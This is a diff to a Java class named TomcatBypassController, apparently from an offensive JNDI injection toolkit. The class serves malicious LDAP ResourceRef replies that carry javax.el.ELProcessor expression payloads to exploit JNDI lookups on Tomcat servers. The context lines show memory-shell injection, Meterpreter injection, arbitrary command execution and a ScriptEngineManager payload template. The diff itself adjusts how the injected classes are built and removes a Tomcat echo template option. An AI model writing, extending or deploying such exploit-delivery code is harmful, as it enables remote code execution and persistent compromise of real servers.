@@ -8,7 +8,6 @@ import com.qi4l.jndi.gadgets.utils.Gadgets;
 import com.qi4l.jndi.gadgets.utils.InjShell;
 import com.qi4l.jndi.gadgets.utils.Util;
 import com.qi4l.jndi.gadgets.utils.handle.ClassNameHandler;
-import com.qi4l.jndi.template.echo.TomcatEchoJndi;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
@@ -31,7 +30,7 @@ public class TomcatBypassController implements LdapController {
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
-            System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for|@" + base + "  @|green with javax.el.ELProcessor payload|@"));
+            System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for |@" + base + "  @|green with javax.el.ELProcessor payload|@"));
             System.out.println("-------------------------------------- JNDI Local  Refenrence Links --------------------------------------");
             Entry e = new Entry(base);
             e.addAttribute("javaClassName", "java.lang.String");
@@ -49,8 +48,7 @@ public class TomcatBypassController implements LdapController {
             if (payloadType.contains("M-")) {
                 String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
                 InjShell.init(params);
-                Class<?> classQ = Gadgets.createClassT(ClassName1).getClass();
-                code = InjShell.injectClass(classQ);
+                code = Gadgets.createClassT(ClassName1);
             }
 
             if (payloadType.contains("command")) {
@@ -61,9 +59,6 @@ public class TomcatBypassController implements LdapController {
                 code = helper.injectMeterpreter();
             }
 
-            if (payloadType.contains("TomcatEcho111")) {
-                code = helper.injectTomcatEchoTemplate();
-            }
 
             String payloadTemplate = "{" +
                     "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
@@ -148,10 +143,6 @@ public class TomcatBypassController implements LdapController {
             WinclassBody.setAccessible(true);
             WinclassBody.set(ctClazz, params[1]);
             return InjShell.injectClass(ctClazz);
-        }
-
-        public String injectTomcatEchoTemplate() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
-            return InjShell.injectClass(TomcatEchoJndi.class);
         }
 
         public String getExecCode(String cmd) throws IOException {
